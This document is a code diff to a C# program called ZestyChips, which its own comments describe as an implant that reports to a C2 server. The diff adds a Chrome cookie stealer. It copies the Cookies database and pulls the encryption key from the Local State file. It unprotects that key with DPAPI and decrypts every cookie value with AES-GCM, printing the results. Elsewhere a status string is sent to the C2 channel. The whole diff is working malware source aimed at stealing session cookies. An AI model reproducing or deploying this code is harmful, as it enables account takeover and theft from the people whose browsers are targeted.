@@ -1,6 +1,11 @@
 using System;
 using System.IO;
 using System.Threading;
+using System.Data.SQLite;
+using System.Text.Json;
+using System.Security.Cryptography;
+using System.Linq;
+using System.Text;
 
 namespace ZestyChips
 {
@@ -25,25 +30,73 @@ namespace ZestyChips
             string result;
             if (flag) {
                 result = "Chrome not found";
-                Helpers.PrintInfo(result);
+                Program.SendBase64EncodedData(result);
             } else {
-                result = "Chrome found, copying..";
-                Helpers.PrintInfo(result);
+                Helpers.PrintInfo("Chrome found, copying..");
                 for(;;) {
                     try {
                         // copy file to dest file name cc
+                        // Helpers.PrintInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
                         File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc", true);
                         break;
-                    } catch {
+                    } catch (Exception ex) {
+                        // exception will throw most likely if chrome is open
+                        // implant will continually run until chrome is closed / process terminated
+                        Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
                         Thread.Sleep(10000); // sleep 10 seconds
                     }
                 }
 
-                // open connection to Cookies database and execute SQL query to extract some fields
-                // .. todo
-            }
+                // open the Chrome cookies database
+                SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=cc");
+                sqliteConnection.Open();
+                SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", sqliteConnection);
+                SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
 
-            Program.SendBase64EncodedData(result); // for fun send to c2
+                // decode & decrypt the encryption key
+                while (sdr.Read()) {
+                    byte[] rawEncryptedChromeRow = (byte[])sdr["encrypted_value"];
+                    string localStateFileData = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "/../Local/Google/Chrome/User Data/Local State");
+
+                    // use native tools to pull out the encrypted encryption key used by Chrome
+                    using JsonDocument doc = JsonDocument.Parse(localStateFileData);
+                    string encryptedKey = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
+
+#pragma warning disable CA1416
+                    byte[] encryptionKey = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine);
+#pragma warning restore CA1416
+
+                    // decrypt encrypted data from chrome
+                    using (MemoryStream memoryStream = new MemoryStream(rawEncryptedChromeRow)) {
+                        using (BinaryReader binaryReader = new BinaryReader(memoryStream)) {
+                            byte[] skippedBytes = binaryReader.ReadBytes(3); 
+
+                            byte[] nonce = binaryReader.ReadBytes(12); // nonce for GCM
+                            byte[] cipherTextWithTag = binaryReader.ReadBytes(rawEncryptedChromeRow.Length - 3 - 12); // remaining bytes are ciphertext plus tag
+
+                            byte[] cipherText = new byte[cipherTextWithTag.Length - 16];
+                            byte[] tag = new byte[16];
+                            Array.Copy(cipherTextWithTag, 0, cipherText, 0, cipherText.Length);
+                            Array.Copy(cipherTextWithTag, cipherText.Length, tag, 0, tag.Length);
+
+                            byte[] decryptedData = new byte[cipherText.Length];
+
+                            using (AesGcm aesGcm = new AesGcm(encryptionKey, tag.Length)) {
+                                try {
+                                    aesGcm.Decrypt(nonce, cipherText, tag, decryptedData);
+                                    string decryptedString = Encoding.UTF8.GetString(decryptedData);
+                                    Helpers.PrintInfo(decryptedString);
+                                }
+                                catch (Exception ex) {
+                                    Helpers.PrintFail($"failed to decrypt data: {ex}");
+                                    return;
+                                }
+                            }
+                        }
+                    }
+
+                }
+            }
         }
     }
 }
